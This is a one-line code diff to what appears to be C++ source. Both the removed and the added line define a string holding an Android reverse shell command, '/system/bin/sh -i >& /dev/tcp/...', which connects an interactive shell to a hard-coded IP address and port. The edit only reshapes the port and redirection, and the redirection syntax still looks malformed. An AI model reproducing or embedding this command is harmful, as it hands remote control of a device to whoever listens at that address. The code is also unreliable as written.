@@ -1,1 +1,1 @@
-std::string command = "/system/bin/sh -i >& /dev/tcp/192.168.43.27/40010&>1";
+std::string command = "/system/bin/sh -i >& /dev/tcp/192.168.43.27/4001 0&>1";
